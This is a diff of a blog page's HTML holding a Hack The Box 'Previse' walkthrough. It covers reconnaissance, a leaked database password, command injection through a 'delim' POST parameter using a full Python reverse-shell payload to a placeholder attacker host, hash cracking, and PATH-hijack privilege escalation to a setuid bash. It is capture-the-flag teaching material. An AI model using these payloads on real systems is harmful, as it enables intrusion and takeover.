@@ -49,54 +49,148 @@
     &lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 &lt;h2 id=&#34;previse-walkthrough&#34;&gt;Previse walkthrough&lt;/h2&gt;
 &lt;h2 id=&#34;enumeration-1&#34;&gt;Enumeration&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;Nmap discovers tcp 22 and 80 ports.&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://previse.htb/login.php&#34;&gt;http://previse.htb/login.php&lt;/a&gt; is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.
-Try with SQLi:&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;1- Nmap discovers tcp 22 and 80 ports.
+{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb
+Nmap scan report for previse.htb (10.10.11.104)
+Host is up (0.068s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;p&gt;2- &lt;a href=&#34;http://previse.htb/login.php&#34;&gt;http://previse.htb/login.php&lt;/a&gt; is a login page. Intercept POST packet with filled parameters to &lt;code&gt;login.php&lt;/code&gt; and save it to &lt;code&gt;request.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Try with SQLi:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -r request.txt -p password 
-&lt;span style=&#34;color:#75715e&#34;&gt;# (try with username too)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# (try with username param too)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;No SQLi flaws discovered by sqlmap.&lt;/p&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;Fuzz the request path.
-wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt &amp;ndash;hc=404 &lt;a href=&#34;http://previse.htb&#34;&gt;http://previse.htb&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Interesting files:
-index.php &amp;ndash; 302 Found &amp;ndash;&amp;gt; RESPONSE1 (see below for details)
+&lt;p&gt;3- Fuzz the request path.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt; http://previse.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Interesting files:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;index.php -- 302 Found --&amp;gt; RESPONSE1 (see step 4 for details)
 login.php
 config.php
-download.php &amp;ndash; 302 &amp;ndash;&amp;gt; login.php
+download.php -- 302 --&amp;gt; login.php
 header.php
 footer.php
-status.php &amp;ndash; 302 &amp;ndash;&amp;gt; MySQL server is running!
+status.php -- 302 --&amp;gt; MySQL server is running!
 nav.php
-accounts.php &amp;ndash; 302 &amp;ndash;&amp;gt; Create an admin account
-files.php &amp;ndash; 302  &amp;ndash;&amp;gt; backup.zip YEAH!!! Site backups are very welcome!&lt;/p&gt;
-&lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;Intercept request packet with BurpSuite and intercept the response. See annotations above.&lt;/li&gt;
-&lt;/ol&gt;
+accounts.php -- 302 --&amp;gt; Create an admin account
+files.php -- 302  --&amp;gt; backup.zip YEAH!!! Site backups are very welcome!
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4- Intercept request packet with BurpSuite and intercept the response. See annotations above.&lt;/p&gt;
 &lt;p&gt;RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).&lt;/p&gt;
-&lt;ol start=&#34;5&#34;&gt;
-&lt;li&gt;The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.
-MySQL credentials:
-root
+&lt;p&gt;5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.
+{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connectDB&lt;/span&gt;(){
+    $host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;;
+    $user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;;
+    $passwd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mySQL_p@ssw0rd!:)&amp;#39;&lt;/span&gt;;
+    $db &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;previse&amp;#39;&lt;/span&gt;;
+    $mycon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mysqli&lt;/span&gt;($host, $user, $passwd, $db);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $mycon;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;p&gt;MySQL credentials:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root
 mySQL_p@ssw0rd!:)
-DBname: previse&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;But we can only access the database from localhost&amp;hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it&amp;rsquo;s specific to MySQL service.&lt;/p&gt;
-&lt;ol start=&#34;6&#34;&gt;
-&lt;li&gt;Revise all files. Look at logs.php. &lt;code&gt;exec()&lt;/code&gt; promises a command injection opportunity.&lt;/li&gt;
-&lt;/ol&gt;
+DBname: previse
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But we can only access the database from localhost&amp;hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it&amp;rsquo;s specific to MySQL service.&lt;/p&gt;
+&lt;p&gt;6- Revise all files in the site backup folder. Look at logs.php. &lt;code&gt;exec()&lt;/code&gt; promises a command injection opportunity.&lt;/p&gt;
+&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;])) {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: login.php&amp;#39;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if (!$_SERVER[&amp;#39;REQUEST_METHOD&amp;#39;] == &amp;#39;POST&amp;#39;) {
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Location: login.php&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    exit;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/////////////////////////////////////////////////////////////////////////////////////
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/////////////////////////////////////////////////////////////////////////////////////
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$output = exec(&amp;#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[&amp;#39;delim&amp;#39;]}&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;echo $output;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$filepath = &amp;#34;/var/www/out.log&amp;#34;;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$filename = &amp;#34;out.log&amp;#34;;    
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if(file_exists($filepath)) {
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Content-Description: File Transfer&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Content-Type: application/octet-stream&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Content-Disposition: attachment; filename=&amp;#34;&amp;#39;.basename($filepath).&amp;#39;&amp;#34;&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Expires: 0&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Cache-Control: must-revalidate&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Pragma: public&amp;#39;);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    header(&amp;#39;Content-Length: &amp;#39; . filesize($filepath));
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    ob_clean(); // Discard data in the output buffer
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    flush(); // Flush system headers
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    readfile($filepath);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    die();
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} else {
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    http_response_code(404);
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    die();
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} 
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;?&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
 &lt;p&gt;The interesting part is here:&lt;/p&gt;
+&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/bin/python /opt/scripts/log_process.py &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;delim&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
 &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $output;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can trigger a reverse shell.&lt;/p&gt;
-&lt;p&gt;Target command: python log_process.py comma;python3 -c &amp;lsquo;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;ATTACKER_IP&amp;rdquo;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/p&gt;
-&lt;p&gt;Change the POST param in Burpsuite:
-delim=comma;python3+-c+&amp;lsquo;import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.0.0.1&amp;rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/p&gt;
-&lt;ol start=&#34;7&#34;&gt;
-&lt;li&gt;To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:&lt;/li&gt;
-&lt;/ol&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;p&gt;We can trigger a reverse shell.&lt;/p&gt;
+&lt;p&gt;Target command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;python log_process.py comma;python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;ATTACKER_IP&amp;#34;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Change the POST param in Burpsuite:
+{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /logs.php HTTP/1.1
+Host: previse.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Origin: http://previse.htb
+DNT: 1
+Connection: close
+Referer: http://previse.htb/file_logs.php
+Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+delim=comma;python3+-c+&#39;import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;p&gt;7- To escalate from a &lt;code&gt;www-data&lt;/code&gt; account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;mysql -u root -p
 Enter password: mySQL_p@ssw0rd!:&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 
@@ -106,28 +200,29 @@ Enter password: mySQL_p@ssw0rd!:&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/
 &lt;span style=&#34;color:#75715e&#34;&gt;# columns id, username, password and created_at&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the username is &lt;code&gt;m4lwhere&lt;/code&gt; and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -m &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; hash.txt --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same but with &amp;ndash;show&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same but with &amp;ndash;show:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username = m4lwhere
 hash = $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
 password = ilovecody112235!
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that john doesn&amp;rsquo;t support non-printable characters in hash.&lt;/p&gt;
-&lt;ol start=&#34;8&#34;&gt;
-&lt;li&gt;SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f&lt;/p&gt;
 &lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
-&lt;ol start=&#34;9&#34;&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt; reveals the script &lt;code&gt;/opt/scripts/access_backup.sh&lt;/code&gt;.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Copy to local machine:&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;9- &lt;code&gt;sudo -l&lt;/code&gt; reveals the script &lt;code&gt;/opt/scripts/access_backup.sh&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;10- Copy to local machine:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By looking at this file, we find command path vulnerability.&lt;/p&gt;
-&lt;ol start=&#34;11&#34;&gt;
-&lt;li&gt;We can put a script named &lt;code&gt;gzip&lt;/code&gt; in the current workdir and execute &lt;code&gt;access_backup.sh&lt;/code&gt; as root.&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# We always make sure to store logs, we take security SERIOUSLY here&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# I know I shouldnt run this as root but I cant figure it out programmatically on my account&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# This is configured to run with cron, added to sudo so I can run as needed - we&amp;#39;ll fix it later when there&amp;#39;s time&lt;/span&gt;
+
+gzip -c /var/log/apache2/access.log &amp;gt; /var/backups/&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date --date&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yesterday&amp;#34;&lt;/span&gt; +%Y%b%d&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;_access.gz
+gzip -c /var/www/file_access.log &amp;gt; /var/backups/&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date --date&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yesterday&amp;#34;&lt;/span&gt; +%Y%b%d&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;_file_access.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;{{ &lt;!-- raw HTML omitted --&gt; }}&lt;/p&gt;
+&lt;p&gt;11- We can put a script named &lt;code&gt;gzip&lt;/code&gt; in the current workdir and execute &lt;code&gt;access_backup.sh&lt;/code&gt; as root.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;cd /tmp
 &lt;span style=&#34;color:#75715e&#34;&gt;# set gzip to be bash with setuid bit&lt;/span&gt;
 cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; gzip 
@@ -135,9 +230,7 @@ cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; gzip
 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cp /bin/bash /tmp/c
 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;chmod u+s /tmp/c
 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;12&#34;&gt;
-&lt;li&gt;Now &lt;code&gt;/tmp/c&lt;/code&gt; is a setuid bash.&lt;/li&gt;
-&lt;/ol&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;12- Now &lt;code&gt;/tmp/c&lt;/code&gt; is a setuid bash.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;/tmp/c -p &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;this flag sets the real userid as the effective userid&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: 23c44ab8465e7ff51a5fab75847e088b&lt;/p&gt;
 
